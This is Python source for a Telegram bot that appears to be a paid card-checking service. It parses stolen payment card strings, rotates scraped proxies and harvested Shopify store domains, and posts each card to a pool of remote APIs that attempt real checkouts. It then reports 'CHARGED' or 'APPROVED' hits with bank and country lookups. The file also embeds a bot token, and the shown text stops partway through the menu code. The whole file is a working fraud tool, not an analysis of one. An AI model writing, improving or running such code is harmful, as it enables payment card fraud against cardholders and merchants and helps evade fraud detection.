import os
import re
import io
import time
import json
import queue
import random
import secrets
import threading
import requests
import telebot
from telebot import types
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone, timedelta

# ==================== CONFIG ====================
BOT_TOKEN = os.getenv("BOT_TOKEN", "8832919810:AAF7rzbr-Tcn5W2WWmEmFh_MoQA9erjmnYY")
ADMIN_ID = 6566026385

API_FILE     = "apis.json"
PROXY_FILE   = "proxies.json"
SITE_FILE    = "sites.json"
USER_FILE    = "users.json"
KEY_FILE     = "keys.json"
PREMIUM_FILE = "premiums.json"

CARD_TIMEOUT       = 60
PROGRESS_REFRESH   = 2.5
PROXY_FAST_WORKERS = 15
PROXY_FAST_TIMEOUT = 8
PROXY_FULL_WORKERS = 10

PREMIUM_TIERS = {
    "basic":    {"days": 7},
    "standard": {"days": 30},
    "premium":  {"days": 90},
}
TIER_LABELS = {
    "basic":    "🥉 Basic",
    "standard": "🥈 Standard",
    "premium":  "💎 Premium",
}

bot = telebot.TeleBot(BOT_TOKEN)

try:
    bot_info = bot.get_me()
    CREDIT = f"@{bot_info.username}" if bot_info.username else "@ZYELEO"
except Exception:
    CREDIT = "@ZYELEO"

# ==================== GLOBAL STOP ====================
STOP_CHECKER     = threading.Event()
STOP_PROXY_CHECK = threading.Event()
STOP_SCRAPE      = threading.Event()

# ==================== STATE ====================
def load_json(file, default=None):
    if default is None: default = []
    if os.path.exists(file):
        try:
            with open(file, 'r') as f:
                data = json.load(f)
                if isinstance(data, list): return list(dict.fromkeys(data))
                if isinstance(data, dict): return data
        except: pass
    return default

def save_json(file, data):
    with open(file, 'w') as f: json.dump(data, f, indent=4)

API_BASES = load_json(API_FILE, [
    "https://shopify-api-b6yt.onrender.com",
    "https://shopiv2.onrender.com",
    "https://shopiv3.onrender.com",
    "https://shpiapi.onrender.com",
    "https://shpiapi-1.onrender.com",
    "https://shpiapi-2.onrender.com",
    "https://shpiapi-3.onrender.com",
    "https://shpiapi-4.onrender.com",
    "https://shpiapi-5.onrender.com",
    "https://shpiapi-6.onrender.com",
    "https://shpiapi-7.onrender.com",
    "https://shpiapi-8.onrender.com",
    "https://shpiapi-9.onrender.com",
    "https://shpiapi-10.onrender.com",
    "https://shpiapi-11.onrender.com",
    "https://shpiapi-12.onrender.com",
    "https://shpiapi-13.onrender.com",
    "https://shpiapi-14.onrender.com",
    "https://shpiapi-15.onrender.com",
    "https://shpiapi-16.onrender.com",
    "https://shpiapi-17.onrender.com",
    "https://shpiapi-18.onrender.com",
    "https://shpiapi-19.onrender.com",
    "https://shpiapi-20.onrender.com",
    "https://shpiapi-21.onrender.com",
    "https://shpiapi-22.onrender.com",
    "https://shpiapi-23.onrender.com",
    "https://shpiapi10.onrender.com",
    "https://shpiapi11.onrender.com",
    "https://shpiapi12.onrender.com",
    "https://shpiapi13.onrender.com",
    "https://shpiapi9.onrender.com",
    "https://shpiapi8.onrender.com",
    "https://shpiapi7.onrender.com",
    "https://shpiapi6.onrender.com",
    "https://shpiapi5.onrender.com",
    "https://shpiapi4.onrender.com",
    "https://shpiapi3.onrender.com",
])

PROXIES  = load_json(PROXY_FILE, [])
SITES    = load_json(SITE_FILE, ["yeezy.com", "skims.com"])
USERS    = load_json(USER_FILE, [])
KEYS     = load_json(KEY_FILE, {})
PREMIUMS = load_json(PREMIUM_FILE, {})

proxy_idx = 0
site_idx  = 0
user_states   = {}
pending_files = {}
pending_scrape = {}

# ==================== ROLE / PREMIUM ====================
def is_admin(uid): return uid == ADMIN_ID

def track_user(uid):
    if uid == ADMIN_ID: return
    if uid not in USERS:
        USERS.append(uid)
        save_json(USER_FILE, USERS)

def is_premium(uid):
    if uid == ADMIN_ID: return True, "admin"
    p = PREMIUMS.get(str(uid))
    if not p: return False, None
    if time.time() > p.get("expires", 0): return False, "expired"
    return True, p.get("tier", "basic")

def premium_tier_label(uid):
    if uid == ADMIN_ID: return "👑 Admin"
    ok, tier = is_premium(uid)
    if ok: return TIER_LABELS.get(tier, "❓")
    return "🚫 Free"

# ==================== KEY GEN / REDEEM ====================
def _seg():
    return "".join(secrets.choice("ABCDEFGHJKLMNPQRSTUVWXYZ23456789") for _ in range(4))

def gen_key(tier="premium", days=None):
    if tier not in PREMIUM_TIERS: return None
    days = days or PREMIUM_TIERS[tier]["days"]
    key = f"{_seg()}-{_seg()}-{_seg()}"
    while key in KEYS:
        key = f"{_seg()}-{_seg()}-{_seg()}"
    now = int(time.time())
    KEYS[key] = {
        "tier": tier, "days": days,
        "created": now,
        "expires": now + (days * 86400),
        "redeemed_by": None,
        "max_uses": 1, "uses": 0,
    }
    save_json(KEY_FILE, KEYS)
    return key

def redeem_key(key, uid):
    key = key.strip().upper()
    if key not in KEYS: return False, "❌ Invalid key."
    k = KEYS[key]
    if k["uses"] >= k["max_uses"]: return False, "❌ Key already used."
    if time.time() > k["expires"]: return False, "❌ Key expired."
    if k["redeemed_by"] and k["redeemed_by"] != uid:
        return False, "❌ Key belongs to another user."
    k["redeemed_by"] = uid
    k["uses"] += 1
    save_json(KEY_FILE, KEYS)
    PREMIUMS[str(uid)] = {"tier": k["tier"], "expires": k["expires"], "redeemed_key": key}
    save_json(PREMIUM_FILE, PREMIUMS)
    exp_str = datetime.fromtimestamp(k["expires"]).strftime("%Y-%m-%d %H:%M")
    return True, f"✅ **Redeemed!**\n\n💎 Tier: **{TIER_LABELS.get(k['tier'], k['tier'])}**\n⏳ Expires: `{exp_str}`"

# ==================== HELPERS ====================
FIRE = ["🔥", "🔥", "💥", "🔥", "✨"]

def get_next_proxy():
    global proxy_idx
    if not PROXIES: return None
    p = PROXIES[proxy_idx % len(PROXIES)]; proxy_idx += 1
    return p

def get_next_site():
    global site_idx
    if not SITES: return "yeezy.com"
    s = SITES[site_idx % len(SITES)]; site_idx += 1
    return s

def parse_combos(text):
    pattern = re.compile(r'([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\s*[|:,]\s*(\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})')
    combos = set()
    for line in text.splitlines():
        line = line.strip()
        if not line: continue
        m = pattern.search(line)
        if m: combos.add((m.group(1).lower(), m.group(2)))
        else:
            cm = re.search(r'(\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})', line)
            if cm: combos.add(("RANDOM_SITE", cm.group(1)))
    return list(combos)

def get_bin_info(cc):
    try:
        r = requests.get(f"https://lookup.binlist.net/{cc[:6]}", headers={"Accept-Version":"3"}, timeout=5)
        if r.status_code == 200:
            d = r.json()
            scheme = d.get("scheme","UNKNOWN").upper()
            type_  = d.get("type","UNKNOWN").upper()
            level  = d.get("brand","UNKNOWN").upper()
            bank   = d.get("bank",{}).get("name","UNKNOWN").upper()
            cname  = d.get("country",{}).get("name","UNKNOWN").upper()
            cemoji = d.get("country",{}).get("emoji","🏳️")
            return f"{scheme} - {type_} - {level}", bank, f"{cname} {cemoji}"
    except: pass
    return "-", "-", "-"

# ==================== HIT FORMAT ====================
def generate_hit_message(combo, site, res_code, price, gate, proxy="None", product="-"):
    bin_info, bank, country = get_bin_info(combo)
    if res_code == "ORDER_PAID":           title = "🔥 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 💎"
    elif res_code == "INSUFFICIENT_FUNDS": title = "💳 𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗙𝗨𝗡𝗗𝗦 ✅"
    elif res_code == "APPROVED":           title = "✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗"
    else:                                  title = f"🔥 {res_code}"

    style = random.randint(1, 3)
    if style == 1:
        return (f"{title}\n\n"
                f"[💎] 𝖢𝖺𝗋𝖽 - `{combo}`\n"
                f"[💎] 𝖦𝖺𝗍𝖾𝗐𝖺𝗒 - {gate}\n"
                f"[💎] 𝖯𝗋𝗈𝖽𝗎𝖼𝗍 - {product}\n"
                f"[💎] 𝖠𝗆𝗈𝗎𝗇𝗍 - {price}$\n"
                f"[💎] 𝖱𝖾𝗌𝗉𝗈𝗇𝗌𝖾 - {res_code}\n"
                f"[💎] 𝖲𝗂𝗍𝖾 - {site}\n"
                f"[💎] 𝖯𝗋𝗈𝗑𝗒 - {proxy}\n\n"
                f"[🔎] 𝖡𝗂𝗇 - {bin_info}\n"
                f"[🔎] 𝖡𝖺𝗇𝗄 - {bank}\n"
                f"[🔎] 𝖢𝗈𝗎𝗇𝗍𝗋𝗒 - {country}\n\n"
                f"👾 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 ➜ {CREDIT} ✅")
    elif style == 2:
        return (f"{title}\n"
                "╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾\n"
                f"💳 `{combo}`\n"
                "╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾\n"
                f"ᴘʀᴏᴅᴜᴄᴛ {product}\n"
                f"ᴀᴍᴏᴜɴᴛ ${price} 💸\n"
                f"ɢᴀᴛᴇ {gate}\n"
                f"ꜱɪᴛᴇ {site}\n"
                f"ᴘʀᴏxʏ {proxy}\n"
                f"ʙɪɴ {bin_info}\n"
                f"ʙᴀɴᴋ {bank} 💳\n"
                f"ᴄᴏᴜɴᴛʀʏ {country}\n"
                f"ʀᴇѕᴘᴏɴѕᴇ {res_code}\n"
                "╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾\n"
                f"ᴄʜᴇᴄᴋᴇʀ {CREDIT} 👤")
    else:
        return (f"{title}\n"
                "━━━━━━━━━━━━━━━\n"
                f"Card ━ `{combo}`\n"
                f"Gateway ━ {gate}\n"
                f"Product ━ {product}\n"
                f"Response ━ {res_code}\n"
                f"Price ━ ${price}\n"
                f"Site ━ {site}\n"
                f"Proxy ━ {proxy}\n"
                "━━━━━━━━━━━━━━━\n"
                f"BIN: {bin_info}\n"
                f"Bank: {bank}\n"
                f"Country: {country}\n\n"
                f"💠 {CREDIT}")

# ==================== PROXY CHECKER ====================
PROXY_TYPE_ICONS = {"HTTP":"🌐","HTTPS":"🔒","SOCKS4":"🧦","SOCKS5":"🧦"}

def _geo_lookup(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,countryCode", timeout=4)
        if r.status_code == 200:
            d = r.json()
            if d.get("status") == "success" and d.get("countryCode"):
                cc = d["countryCode"].upper()
                flag = "".join(chr(0x1F1E6 + ord(c) - ord('A')) for c in cc if 'A' <= c <= 'Z')
                return cc, flag or "🏳️"
    except: pass
    return "??", "🏳️"

def _normalize_proxy(proxy):
    raw = proxy.strip()
    m = re.match(r"^(\w+)://(.+)$", raw)
    scheme, host = (m.group(1).lower(), m.group(2)) if m else ("http", raw)
    ip_port = host.split("@")[-1]
    if ":" not in ip_port: return scheme, None, None, None
    ip, port = ip_port.rsplit(":", 1)
    if not port.isdigit(): return scheme, None, None, None
    sm = {"http":"http","https":"https","socks4":"socks4","socks5":"socks5"}
    scheme = sm.get(scheme, "http")
    return scheme, f"{scheme}://{host}", ip, int(port)

def check_single_proxy(proxy, timeout=6):
    scheme, proxy_url, ip, port = _normalize_proxy(proxy)
    if not proxy_url: return None
    for ts in [scheme] + (["socks5","socks4"] if scheme == "http" else []):
        try_url = f"{ts}://{proxy_url.split('://',1)[1]}"
        try:
            t0 = time.time()
            r = requests.get("http://ip-api.com/json/?fields=status,query",
                             proxies={"http": try_url, "https": try_url}, timeout=timeout)
            lat = int((time.time() - t0) * 1000)
            if r.status_code == 200 and r.json().get("status") == "success":
                ip_out = r.json().get("query", ip)
                cc, flag = _geo_lookup(ip_out)
                return {"proxy":proxy,"scheme":ts.upper(),"ip":ip,"port":port,
                        "latency":lat,"country":cc,"flag":flag,"alive":True}
        except: continue
    return None

def _format_proxy_line(e):
    icon = PROXY_TYPE_ICONS.get(e["scheme"], "🌐")
    return (f"🌍 `{e['ip']}:{e['port']}`\n"
            f"      {icon} **{e['scheme']}** • ⚡ {e['latency']}ms • {e.get('flag','🏳️')} **{e.get('country','??')}**")

def proxy_check_thread(msg, proxies_to_check):
    STOP_PROXY_CHECK.clear()
    total = len(proxies_to_check)
    if total == 0:
        bot.edit_message_text("❌ No proxies.", chat_id=msg.chat.id, message_id=msg.message_id); return
    alive, dead, done = [], 0, 0
    lock = threading.Lock(); start = time.time()

    def prog():
        pct = int((done/total)*100) if total else 0
        bar = "█"*int(pct/10) + "░"*(10-int(pct/10))
        return (f"🔍 **Checking Proxies**\n📊 `[{bar}]` {pct}%\n"
                f"📥 {done}   ✅ {len(alive)}   ❌ {dead}\n"
                f"⏱️ {time.time()-start:.1f}s\n💠 {CREDIT}")

    def worker(p):
        nonlocal done, dead
        if STOP_PROXY_CHECK.is_set(): return
        r = check_single_proxy(p, timeout=PROXY_FAST_TIMEOUT)
        with lock:
            done += 1
            if r: alive.append(r)
            else: dead += 1
            if done % 10 == 0 or done == total:
                try: bot.edit_message_text(prog(), chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
                except: pass

    with ThreadPoolExecutor(max_workers=PROXY_FULL_WORKERS) as ex:
        list(ex.map(worker, proxies_to_check))

    alive.sort(key=lambda x: x["latency"])
    global PROXIES
    PROXIES = [a["proxy"] for a in alive]
    save_json(PROXY_FILE, PROXIES)

    header = (f"🚀 **Check results** • {time.time()-start:.1f}s\n"
              f"📥 {total}  ✅ {len(alive)}  ❌ {dead}\n")
    if not alive:
        bot.edit_message_text(header + "❌ _No alive._\n💠 " + CREDIT,
                              chat_id=msg.chat.id, message_id=msg.message_id,
                              reply_markup=proxy_menu(), parse_mode='Markdown'); return
    PAGE = 20
    pages = [alive[i:i+PAGE] for i in range(0, len(alive), PAGE)]
    first = [header] + [_format_proxy_line(e) for e in pages[0]]
    if len(pages) > 1: first.append(f"… +{len(alive)-PAGE}")
    first.append(f"💠 {CREDIT}")
    try:
        bot.edit_message_text("\n".join(first), chat_id=msg.chat.id, message_id=msg.message_id,
                              reply_markup=proxy_menu(), parse_mode='Markdown')
    except: pass
    for idx, page in enumerate(pages[1:], 2):
        lines = [f"📄 **Page {idx}/{len(pages)}**"] + [_format_proxy_line(e) for e in page] + [f"💠 {CREDIT}"]
        try:
            bot.send_message(msg.chat.id, "\n".join(lines), parse_mode='Markdown'); time.sleep(0.6)
        except: pass

def fast_check_and_save(msg, raw, limit):
    STOP_PROXY_CHECK.clear()
    sample = random.sample(raw, min(limit, len(raw)))
    total = len(sample)
    alive, dead, done = [], 0, 0
    lock = threading.Lock(); start = time.time()

    def prog():
        pct = int((done/total)*100) if total else 0
        bar = "█"*int(pct/10) + "░"*(10-int(pct/10))
        return (f"⚡ **Fast Proxy Check**\n📊 `[{bar}]` {pct}%\n"
                f"📥 {done}/{total}  ✅ {len(alive)}  ❌ {dead}\n"
                f"⏱️ {time.time()-start:.1f}s\n💠 {CREDIT}")

    def worker(p):
        nonlocal done, dead
        if STOP_PROXY_CHECK.is_set(): return
        r = check_single_proxy(p, timeout=PROXY_FAST_TIMEOUT)
        with lock:
            done += 1
            if r: alive.append(r)
            else: dead += 1
            if done % 15 == 0 or done == total:
                try: bot.edit_message_text(prog(), chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
                except: pass

    with ThreadPoolExecutor(max_workers=PROXY_FAST_WORKERS) as ex:
        list(ex.map(worker, sample))

    alive.sort(key=lambda x: x["latency"])
    global PROXIES
    before = len(PROXIES)
    for a in alive:
        if a["proxy"] not in PROXIES: PROXIES.append(a["proxy"])
    save_json(PROXY_FILE, PROXIES)
    added = len(PROXIES) - before
    bot.edit_message_text(
        f"⚡ **Fast Check Done**\n📥 Checked: `{total}`\n✅ Alive: `{len(alive)}`\n"
        f"❌ Dead: `{dead}`\n🆕 Added: `{added}`\n📦 Pool: `{len(PROXIES)}`\n"
        f"⏱️ {time.time()-start:.1f}s\n💠 {CREDIT}",
        chat_id=msg.chat.id, message_id=msg.message_id,
        reply_markup=proxy_menu(), parse_mode='Markdown')

# ==================== SCRAPERS ====================
PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all",
]
PROXY_LINE = re.compile(r'^(\d{1,3}\.){3}\d{1,3}:\d{2,5}$')

def scrape_proxies_thread(msg):
    STOP_SCRAPE.clear()
    bot.edit_message_text("🕷️ **Scraping Proxies…**", chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
    found, ok = set(), 0
    for i, src in enumerate(PROXY_SOURCES):
        if STOP_SCRAPE.is_set(): break
        try:
            r = requests.get(src, timeout=15, headers={"User-Agent":"Mozilla/5.0"})
            if r.status_code == 200:
                ok += 1
                for line in r.text.splitlines():
                    line = line.strip()
                    if PROXY_LINE.match(line): found.add(line)
        except: pass
        if i % 3 == 0:
            try: bot.edit_message_text(
                f"🕷️ **Scraping…**\nsources: {i+1}/{len(PROXY_SOURCES)}\nraw: `{len(found)}`",
                chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
            except: pass

    raw = list(found)
    if not raw:
        bot.edit_message_text("❌ No raw proxies.", chat_id=msg.chat.id, message_id=msg.message_id,
                              reply_markup=proxy_menu(), parse_mode='Markdown'); return

    pending_scrape[msg.chat.id] = {"raw": raw, "msg_id": msg.message_id}
    markup = types.InlineKeyboardMarkup(row_width=3)
    for n in (50, 100, 200, 500, 1000):
        markup.add(types.InlineKeyboardButton(f"🔍 Check {n}", callback_data=f"pscrape_{n}"))
    markup.add(types.InlineKeyboardButton(f"🔍 Check ALL ({len(raw)})", callback_data=f"pscrape_{len(raw)}"))
    markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="menu_proxy"))

    bot.edit_message_text(
        f"🕷️ **Scrape Done**\n📡 Sources: `{ok}/{len(PROXY_SOURCES)}`\n"
        f"📦 Raw: `{len(raw)}`\n⚠️ Nothing saved. Pick amount:\n💠 {CREDIT}",
        chat_id=msg.chat.id, message_id=msg.message_id,
        reply_markup=markup, parse_mode='Markdown')

SHOPIFY_SITE_SOURCES = [
    "https://raw.githubusercontent.com/KingBogdan/Shopify-Store-Scraper/main/domains.txt",
    "https://raw.githubusercontent.com/github-things/shopify-stores-list/main/shops.txt",
    "https://raw.githubusercontent.com/farukalamai/shopify-shops/main/websites.txt",
]
SHOPIFY_HOST = re.compile(r'^([a-z0-9-]+)\.myshopify\.com$', re.IGNORECASE)
PLAIN_DOMAIN = re.compile(r'^[a-z0-9-]+(\.[a-z0-9-]+)+$', re.IGNORECASE)

def scrape_sites_thread(msg, max_add=200):
    STOP_SCRAPE.clear()
    bot.edit_message_text("🕷️ **Scraping Sites…**", chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
    found = set()
    for src in SHOPIFY_SITE_SOURCES:
        if STOP_SCRAPE.is_set(): break
        try:
            r = requests.get(src, timeout=20, headers={"User-Agent":"Mozilla/5.0"})
            if r.status_code == 200:
                for line in r.text.splitlines():
                    line = line.strip().lower()
                    if not line or line.startswith("#"): continue
                    if SHOPIFY_HOST.match(line): found.add(line)
                    elif PLAIN_DOMAIN.match(line) and not any(x in line for x in ("github.com","raw.","google.","amazon.")):
                        found.add(line)
        except: pass
    global SITES
    before = len(SITES); added = 0
    for s in found:
        if len(SITES) >= before + max_add: break
        if s not in SITES: SITES.append(s); added += 1
    save_json(SITE_FILE, SITES)
    bot.edit_message_text(
        f"🕷️ **Site Scrape Done**\n🆕 New: `{added}`\n📦 Total: `{len(SITES)}`\n💠 {CREDIT}",
        chat_id=msg.chat.id, message_id=msg.message_id,
        reply_markup=site_menu(), parse_mode='Markdown')

# ==================== WORKER ENGINE — ONE API = ONE WORKER ====================
def api_worker(api_url, combo_queue, msg, progress_lock, stats, use_proxy, owner_uid):
    """One worker bound to one API. No duplicates. All APIs parallel."""
    session = requests.Session()
    while not STOP_CHECKER.is_set():
        try: site, combo = combo_queue.get_nowait()
        except queue.Empty: break
        if STOP_CHECKER.is_set(): break

        url = f"{api_url}/shopii"
        payload = {"site": site, "cc": combo}
        proxy = "None"
        if use_proxy:
            p = get_next_proxy()
            if p: proxy = p; payload["proxy"] = p

        result = {}
        try:
            r = session.post(url, json=payload, timeout=CARD_TIMEOUT)
            if r.status_code == 200:
                result = r.json()
                res   = result.get("Response","").upper()
                price = result.get("Price","0.00")
                gate  = result.get("Gateway","shopify_payments")
            else:
                res, price, gate = f"HTTP_{r.status_code}", "0.00", "unknown"
        except:
            res, price, gate = "TIMEOUT", "0.00", "unknown"

        product = "-"
        for k in ("Product","product","Item","item","Name","name","Title","title"):
            v = result.get(k)
            if v: product = str(v); break

        with progress_lock:
            stats['checked'] += 1
            is_hit = res in ("ORDER_PAID","CHARGED","INSUFFICIENT_FUNDS","APPROVED")
            site_short = site[:15] + "..." if len(site) > 18 else site
            stats['last_combo'] = combo

            if res in ("ORDER_PAID","CHARGED"):
                stats['charged'] += 1; stats['hits'] += 1
            elif res in ("APPROVED","INSUFFICIENT_FUNDS"):
                stats['approved'] += 1; stats['hits'] += 1
            elif res == "TIMEOUT" or res.startswith("HTTP_") or res == "ERROR":
                stats['errors'] += 1
            else:
                stats['bad'] += 1

            line = (f"{random.choice(FIRE)} `{site_short}` ┃ {product[:18]} ┃ ${price} ┃ ✅ {res}"
                    if is_hit else
                    f"{random.choice(['▪️','▫️','▪️'])} `{site_short}` ┃ {product[:18]} ┃ ${price} ┃ ❌ {res[:8]}")
            stats['recent'].append(line)
            if len(stats['recent']) > 8: stats['recent'].pop(0)

            if is_hit:
                stats['hits_lines'].append(f"{site} | {combo} | {res} | {price}$ | {product} | Proxy: {proxy}\n")
                try:
                    sent = bot.send_message(msg.chat.id,
                        generate_hit_message(combo, site, res, price, gate, proxy, product),
                        parse_mode='Markdown')
                    if res in ("ORDER_PAID","CHARGED"):
                        try: bot.pin_chat_message(msg.chat.id, sent.message_id)
                        except: pass
                except: pass
        combo_queue.task_done()

def process_bulk_thread(msg, combos, use_proxy, owner_uid=None):
    STOP_CHECKER.clear()
    total = len(combos)
    combo_queue = queue.Queue()
    for s, c in combos:
        if s == "RANDOM_SITE": combo_queue.put((get_next_site(), c))
        else: combo_queue.put((s, c))

    stats = {'checked':0,'hits':0,'bad':0,'approved':0,'charged':0,'errors':0,
             'hits_lines':[],'recent':[],'last_combo':''}
    progress_lock = threading.Lock()
    start_time = time.time()

    unique_apis = list(dict.fromkeys(API_BASES))
    # ONE API = ONE WORKER. No speed profile. All parallel.
    max_workers = min(len(unique_apis), len(combos))

    threads = []
    for i in range(max_workers):
        api_url = unique_apis[i].rstrip("/")
        t = threading.Thread(
            target=api_worker,
            args=(api_url, combo_queue, msg, progress_lock, stats, use_proxy, owner_uid),
            daemon=True
        )
        t.start(); threads.append(t)

    last_update = time.time()
    ist = timezone(timedelta(hours=5, minutes=30))
    owner_label = premium_tier_label(owner_uid) if owner_uid else "❓ Unknown"

    while any(t.is_alive() for t in threads):
        time.sleep(PROGRESS_REFRESH)
        if STOP_CHECKER.is_set(): break
        now = time.time()
        if now - last_update > PROGRESS_REFRESH:
            last_update = now
            with progress_lock:
                checked = stats['checked']
                pct = round((checked / total) * 100, 1) if total > 0 else 0.0
                now_str = datetime.now(ist).strftime("%I:%M:%S %p IST")
                status_str = "𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚..." if not STOP_CHECKER.is_set() else "𝗦𝗧𝗢𝗣𝗣𝗘𝗗"

                last_card = stats.get('last_combo') or "-----"
                last_res = "-----"; last_price = "0.00"
                for line in reversed(stats['recent']):
                    rm = re.search(r'\$\s*([\d.]+)\s*┃\s*[❌✅]+\s*([A-Z_]+)', line)
                    if rm:
                        last_price = rm.group(1); last_res = rm.group(2); break

                text = (
                    f"⚡ メＺＹＥＬＥＯｘ 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 ⚡\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"💥 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ➜ 𝙎𝙃𝙊𝙋𝙄𝙁𝙔\n"
                    f"🔄 𝗦𝗧𝗔𝗧𝗨𝗦 ➜ {status_str}\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"🔗 Process➜ {pct}% | {checked}/{total}\n"
                    f"💳 CC ➜ {last_card}\n"
                    f"💰 Price ➜ {last_price} USD$\n"
                    f"❌ Res ➜ {last_res}\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ➜ {stats['approved']}\n"
                    f"💎 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ➜ {stats['charged']}\n"
                    f"❌ 𝗗𝗘𝗔𝗗 ➜ {stats['bad']}\n"
                    f"⚠️ 𝗘𝗥𝗥𝗢𝗥𝗦 ➜ {stats['errors']}\n"
                    f"⏳ 𝗧𝗜𝗠𝗘 ➜ {now_str}\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"👑 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➜ {owner_label}\n"
                    f"🤖 𝗕𝗼𝘁 𝗕𝘆 ➜ メ𝗔𝗟𝗟𝗨𝗦"
                )
                try: bot.edit_message_text(text, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
                except: pass

    if STOP_CHECKER.is_set():
        summary = f"🛑 **Stopped**\n\nChecked: `{stats['checked']:,}/{total:,}`\nHits: `{stats['hits']:,}`"
    else:
        summary = (f"✅ **Done!** 🎉\n\nTotal: `{total:,}`\nHits: `{stats['hits']:,}`\nBad: `{stats['bad']:,}`\n\n💠 {CREDIT}")
    try: bot.edit_message_text(summary, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
    except: pass
    if stats['hits'] > 0:
        bot.send_document(msg.chat.id, (f"hits_{int(time.time())}.txt", "".join(stats['hits_lines']).encode()),
                          caption=f"🔥 **{stats['hits']:,} Hits**\n💠 {CREDIT}", parse_mode='Markdown')

# ==================== SINGLE CHECK ====================
def single_check_thread(message, combo_data):
    site, combo = combo_data
    if site == "RANDOM_SITE": site = get_next_site()
    msg = bot.reply_to(message, f"🔍 Checking `{site}`...", parse_mode='Markdown')
    api = API_BASES[0].rstrip("/")
    result = {}
    try:
        r = requests.post(f"{api}/shopii", json={"site": site, "cc": combo}, timeout=CARD_TIMEOUT)
        result = r.json() if r.status_code == 200 else {"Response": f"HTTP_{r.status_code}"}
    except: result = {"Response": "TIMEOUT"}
    res = result.get("Response","ERROR").upper()
    price = result.get("Price","0.00")
    gate = result.get("Gateway","shopify_payments")
    product = "-"
    for k in ("Product","product","Item","item","Name","name","Title","title"):
        v = result.get(k)
        if v: product = str(v); break
    is_hit = res in ("ORDER_PAID","CHARGED","INSUFFICIENT_FUNDS","APPROVED")
    if is_hit:
        sent = bot.edit_message_text(generate_hit_message(combo, site, res, price, gate, "None", product),
                                     chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
        if res in ("ORDER_PAID","CHARGED"):
            try: bot.pin_chat_message(msg.chat.id, sent.message_id)
            except: pass
    else:
        bot.edit_message_text(f"❌ **Declined**\n💳 `{combo}`\n🏪 {site}\n📦 {product}\n💵 ${price}\n📝 {res}\n\n💠 {CREDIT}",
                              chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')

# ==================== MENUS ====================
def user_menu():
    m = types.InlineKeyboardMarkup(row_width=1)
    m.add(types.InlineKeyboardButton("🛠 How to Use", callback_data="user_help"))
    return m

def main_menu():
    m = types.InlineKeyboardMarkup(row_width=2)
    m.add(
        types.InlineKeyboardButton("⚙️ APIs", callback_data="menu_api"),
        types.InlineKeyboardButton("🌐 Proxies", callback_data="menu_proxy"),
        types.InlineKeyboardButton("🏪 Sites", callback_data="menu_site"),
        types.InlineKeyboardButton("📊 Stats", callback_data="menu_stats"),
        types.InlineKeyboardButton("🔑 Keygen", callback_data="menu_keygen"),
        types.InlineKeyboardButton("👥 Users", callback_data="menu_users"),
    )
    m.add(types.InlineKeyboardButton("🛠 How to Use", callback_data="menu_help"))
    return m

def proxy_menu():
    m = types.InlineKeyboardMarkup(row_width=2)
    m.add(
        types.InlineKeyboardButton("📤 Upload TXT", callback_data="proxy_upload"),
        types.InlineKeyboardButton("🔍 Check All", callback_data="proxy_check"),
        types.InlineKeyboardButton("🕷️ Auto Scrape", callback_data="proxy_scrape"),
        types.InlineKeyboardButton("🧹 Clear All", callback_data="proxy_clear"),
    )
    m.add(types.InlineKeyboardButton("🔙 Back", callback_data="menu_main"))
    return m

def site_menu():
    m = types.InlineKeyboardMarkup(row_width=2)
    m.add(
        types.InlineKeyboardButton("➕ Add Site", callback_data="site_add"),
        types.InlineKeyboardButton("📜 List Sites", callback_data="site_list"),
        types.InlineKeyboardButton("🕷️ Auto Scrape", callback_data="site_scrape"),
